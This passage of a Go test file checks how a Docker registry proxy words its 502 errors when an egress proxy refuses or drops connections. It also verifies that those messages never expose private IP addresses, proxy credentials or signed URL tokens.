			want:     "auth discovery failed at https://registry.home.lan: egress proxy refused CONNECT (502)" + fakeIPProxyHintFor("registry.home.lan"),
		},
		{
			name:     "CONNECT refused for a public answer",
			registry: "https://registry.example",
			answers:  publicAnswers,
			proxy:    refuseConnect(http.StatusForbidden, nil),
			path:     manifest,
			want:     "auth discovery failed at https://registry.example: egress proxy refused CONNECT (403)" + noProxyHintFor("registry.example"),
		},
		{
			name:     "502 from the proxy for plain http and a fake-IP answer",
			registry: "http://registry.home.lan",
			answers:  fakeIPAnswers,
			proxy:    gatewayAnswer(http.StatusBadGateway),
			path:     manifest,
			want:     "auth discovery failed at http://registry.home.lan: returned 502 through the egress proxy" + fakeIPProxyHintFor("registry.home.lan"),
		},
		{
			name:     "502 from the proxy for plain http and a public answer",
			registry: "http://registry.example",
			answers:  publicAnswers,
			proxy:    gatewayAnswer(http.StatusBadGateway),
			path:     manifest,
			want:     "auth discovery failed at http://registry.example: returned 502 through the egress proxy" + noProxyHintFor("registry.example"),
		},
		{
			name:          "tunnel closed right after CONNECT for a fake-IP answer",
			registry:      "https://registry.home.lan",
			answers:       fakeIPAnswers,
			proxy:         closeTunnel(t),
			path:          manifest,
			want:          "auth discovery failed at https://registry.home.lan: %s" + fakeIPProxyHintFor("registry.home.lan"),
			transportCode: true,
		},
		{
			name:          "tunnel closed right after CONNECT for a public answer",
			registry:      "https://registry.example",
			answers:       publicAnswers,
			proxy:         closeTunnel(t),
			path:          manifest,
			want:          "auth discovery failed at https://registry.example: %s",
			transportCode: true,
		},
		{
			// The proxy reached a server whose certificate fails, which a
			// real DNS answer would not change.
			name:     "TLS failure through the tunnel for a fake-IP answer",
			registry: "https://registry.home.lan",
			answers:  fakeIPAnswers,
			proxy:    tunnelTo(t, untrusted.Listener.Addr().String()),
			path:     manifest,
			want:     "auth discovery failed at https://registry.home.lan: tls",
		},
		{
			name:     "fake-IP redirect target that a 502 body may not name",
			registry: "http://harbor.lan",
			answers: staticIPResolver{
				"harbor.lan":  dnsAnswer("192.168.1.20"),
				"a!b.example": dnsAnswer("198.18.0.12"),
			},
			proxy:  refuseConnect(http.StatusBadGateway, nil),
			direct: redirectTo("https://a!b.example/registry-v2/data?Signature=SECRET-SIGNATURE"),
			path:   blob,
			want:   "blob failed at ***: egress proxy refused CONNECT (502)" + fakeIPProxyHintForOtherHost("***"),
		},
		{
			name:     "registry that a 502 body may not name",
			registry: "http://a!b.example",
			answers:  staticIPResolver{"a!b.example": dnsAnswer("93.184.216.34")},
			proxy:    gatewayAnswer(http.StatusBadGateway),
			path:     manifest,
			want:     "auth discovery failed at ***: returned 502 through the egress proxy" + noProxyHintFor("***"),
		},
		{
			name:     "fake-IP realm of a registry dialed directly",
			registry: "http://harbor.lan",
			answers: staticIPResolver{
				"harbor.lan":    dnsAnswer("192.168.1.20"),
				"auth.home.lan": dnsAnswer("198.18.0.11"),
			},
			proxy:  refuseConnect(http.StatusBadGateway, nil),
			direct: challengeWith(`Bearer realm="https://auth.home.lan/token",service="harbor.lan"`),
			path:   manifest,
			want:   "token fetch failed at https://auth.home.lan: egress proxy refused CONNECT (502)" + fakeIPProxyHintForOtherHost("auth.home.lan"),
		},
		{
			// A registry pinned public may not reach a private answer, so a
			// real DNS answer would not help its CDN host.
			name:     "fake-IP redirect target of a fake-IP registry",
			registry: "http://registry.home.lan",
			answers: staticIPResolver{
				"registry.home.lan": dnsAnswer("198.18.0.10"),
				"cdn.example":       dnsAnswer("198.18.0.12"),
			},
			proxy: refuseConnect(http.StatusBadGateway, redirectTo("https://cdn.example/registry-v2/data?Signature=SECRET-SIGNATURE")),
			path:  blob,
			want:  "blob failed at https://cdn.example: egress proxy refused CONNECT (502)",
		},
		{
			// no_proxy decides from the registry's own host only.
			name:     "public redirect target of a public registry",
			registry: "http://registry.example",
			answers: staticIPResolver{
				"registry.example": dnsAnswer("93.184.216.34"),
				"cdn.example":      dnsAnswer("93.184.216.35"),
			},
			proxy: refuseConnect(http.StatusForbidden, redirectTo("https://cdn.example/registry-v2/data?Signature=SECRET-SIGNATURE")),
			path:  blob,
			want:  "blob failed at https://cdn.example: egress proxy refused CONNECT (403)",
		},
		{
			name:     "registry's own proxy refusing CONNECT for a fake-IP answer",
			registry: "https://registry.home.lan",
			own:      true,
			answers:  fakeIPAnswers,
			proxy:    refuseConnect(http.StatusBadGateway, nil),
			path:     manifest,
			want:     "auth discovery failed at https://registry.home.lan: egress proxy refused CONNECT (502)",
		},
		{
			name:     "registry's own proxy answering 502 for plain http",
			registry: "http://registry.home.lan",
			own:      true,
			answers:  fakeIPAnswers,
			proxy:    gatewayAnswer(http.StatusBadGateway),
			path:     manifest,
			want:     "auth discovery failed at http://registry.home.lan: returned 502",
		},
		{
			name:     "direct leg that cannot connect",
			registry: "http://harbor.lan",
			answers:  staticIPResolver{"harbor.lan": dnsAnswer("192.168.1.20")},
			proxy:    refuseConnect(http.StatusBadGateway, gatewayAnswer(http.StatusBadGateway)),
			path:     manifest,
			want:     "auth discovery failed at http://harbor.lan: connection_refused",
		},
	} {
		t.Run(tt.name, func(t *testing.T) {
			proxy := newRecordingProxy(t, tt.proxy)
			proxyURL, proxyAddress := proxy.URL, proxy.address()
			dialer := &routedDialer{proxies: map[string]bool{proxyAddress: true}, direct: closedAddress(t)}
			if tt.direct != nil {
				server := httptest.NewServer(tt.direct)
				t.Cleanup(server.Close)
				dialer.direct = server.Listener.Addr().String()
			}
			registry := config.RegistryConfig{Name: "hub", URL: tt.registry}
			policy := egress.Policy{}
			if tt.own {
				registry.Proxy = proxyURL
			} else {
				var err error
				if policy, err = egress.NewPolicy(proxyURL, nil, nil); err != nil {
					t.Fatal(err)
				}
			}
			core, logs := observer.New(zap.ErrorLevel)
			t.Cleanup(zap.ReplaceGlobals(zap.New(core)))
			router, _ := newRoutedDockerRouter(t, registry, policy, tt.answers, dialer.DialContext, false)

			response := serveWithRequestID(router, http.MethodGet, tt.path, testRequestID)
			_, message := badGatewayBody(t, response)
			text, ok := strings.CutSuffix(message, testRequestSuffix)
			matched := ok && text == tt.want
			if ok && tt.transportCode {
				matched = text == fmt.Sprintf(tt.want, "network") || text == fmt.Sprintf(tt.want, "connection_refused")
			}
			if !matched {
				t.Fatalf("502 message = %q, want %q", message, tt.want+testRequestSuffix)
			}
			if len(text) > maxClientMessageBytes {
				t.Fatalf("502 message of %d bytes exceeds the cap", len(text))
			}
			for _, hidden := range []string{
				proxyAddress, "198.18.0.10", "198.18.0.11", "198.18.0.12", "2001:2::a", "192.168.1.20", "93.184.216.3",
				"PROXY-SECRET", "SECRET-SIGNATURE", "Bad Gateway", "Forbidden", "Connection established", "a!b",
			} {
				if strings.Contains(message, hidden) {
					t.Fatalf("502 message %q contains %q", message, hidden)
				}
			}
			if logged := loggedErrorsOf(logs, testRequestID); len(logged) != 1 || strings.Contains(logged[0], "PROXY-SECRET") {
				t.Fatalf("errors logged under request %s = %q, want one without the proxy page's token", testRequestID, logged)
			}
		})
	}
}

// The [egress] default proxy may answer a plain-http request with 502, 503 or
// 504 itself, so the proxied leg turns such an answer into a refusal. Over
// https, the proxy only tunnels, and the same status comes from the registry,
// so the leg passes it on as an answer.
func TestProxiedLegRefusesAGatewayStatusOnlyForPlainHTTP(t *testing.T) {
	policy, err := egress.NewPolicy("http://proxy.example:3128", nil, nil)
	if err != nil {
		t.Fatal(err)
	}
	for _, status := range []int{http.StatusBadGateway, http.StatusServiceUnavailable, http.StatusGatewayTimeout} {
		for _, scheme := range []string{"https", "http"} {
			t.Run(fmt.Sprintf("%s/%d", scheme, status), func(t *testing.T) {
				registry := config.RegistryConfig{Name: "hub", URL: scheme + "://registry.example"}
				client, err := buildRegistryClient(
					registry.Name, registry.URL, registryEgressFor(registry, policy),
					staticIPResolver{"registry.example": dnsAnswer("93.184.216.34")}, nil,
				)
				if err != nil {
					t.Fatal(err)
				}
				split, ok := client.Transport.(*splitRoundTripper)
				if !ok {
					t.Fatalf("transport = %T, want the default proxy's split", client.Transport)
				}
				// The proxied leg's answer stands in for the proxy's or, through
				// a tunnel, the registry's.
				split.preflight.transport = roundTripFunc(func(request *http.Request) (*http.Response, error) {
					return &http.Response{
						StatusCode: status,
						Header:     http.Header{},
						Body:       io.NopCloser(strings.NewReader("registry page")),
						Request:    request,
					}, nil
				})

				response, err := client.Get(registry.URL + "/v2/")
				if scheme == "https" {
					if err != nil {
						t.Fatalf("GET over https: %v, want the registry's %d", err, status)
					}
					body, readErr := io.ReadAll(response.Body)
					_ = response.Body.Close()
					if response.StatusCode != status || readErr != nil || string(body) != "registry page" {
						t.Fatalf("answer = %d %q (%v), want the registry's %d", response.StatusCode, body, readErr, status)
					}
					return
				}
				if response != nil {
					_ = response.Body.Close()
				}
				want := fmt.Sprintf("returned %d through the egress proxy", status) + noProxyHintFor("registry.example")
				if err == nil || clientReasonOf(err) != want {
					t.Fatalf("GET over plain http: error %v, want the refusal %q", err, want)
				}
			})
		}
	}
}

// The direct leg's 502 names the host, never the private address it
// resolved to, and never the proxy. (An answer that changed at the dial:
// TestDirectLegChecksTheAnswerAgainWhenItDials.)
func TestBadGatewayOfTheDirectLegNamesNoAddress(t *testing.T) {
	for _, tt := range []struct {
		name string
		path string
		// refused makes the registry refuse connections.
		refused bool
		want    string
		logged  string
	}{
		{
			name:    "registry that refuses the connection",
			path:    "/v2/library/widget/manifests/latest",
			refused: true,
			want:    "auth discovery failed at http://harbor.lan: connection_refused",
			logged:  "connection refused",
		},
		{
			name:   "storage redirect to a loopback answer",
			path:   "/v2/library/widget/blobs/sha256:4f1e",
			want:   "blob failed at http://loopback.lan: Docker proxy target crossed network scope",
			logged: "Docker proxy target crossed network scope",
		},
	} {
		t.Run(tt.name, func(t *testing.T) {
			registry := httptest.NewServer(redirectTo("http://loopback.lan/bucket/blob"))
			t.Cleanup(registry.Close)
			proxy := newRecordingProxy(t, nil)
			dialer := &routedDialer{proxies: map[string]bool{proxy.address(): true}, direct: registry.Listener.Addr().String()}
			if tt.refused {
				dialer.direct = closedAddress(t)
			}
			policy, err := egress.NewPolicy("http://operator:proxy-secret@"+proxy.address(), nil, nil)
			if err != nil {
				t.Fatal(err)
			}
			resolve := staticIPResolver{"harbor.lan": dnsAnswer("192.168.1.20"), "loopback.lan": dnsAnswer("127.0.0.1")}
			core, logs := observer.New(zap.ErrorLevel)
			t.Cleanup(zap.ReplaceGlobals(zap.New(core)))
			router, _ := newRoutedDockerRouter(t, config.RegistryConfig{Name: "hub", URL: "http://harbor.lan"}, policy, resolve, dialer.DialContext, false)

			response := serveWithRequestID(router, http.MethodGet, tt.path, testRequestID)
			_, message := badGatewayBody(t, response)
			if message != tt.want+testRequestSuffix {
				t.Fatalf("502 message = %q, want %q", message, tt.want+testRequestSuffix)
			}
			for _, hidden := range []string{
				"192.168.1.20", "127.0.0.1", proxy.address(), "proxy-secret",
			} {
				if strings.Contains(message, hidden) {
					t.Fatalf("502 message %q contains %q", message, hidden)
				}
			}
			if logged := loggedErrorsOf(logs, testRequestID); len(logged) != 1 || !strings.Contains(logged[0], tt.logged) {
				t.Fatalf("errors logged under request %s = %q, want one containing %q", testRequestID, logged, tt.logged)
			}
			if got := proxy.requestedHosts(); len(got) != 0 {
				t.Fatalf("proxy carried %v, want nothing", got)
			}
		})
	}
}
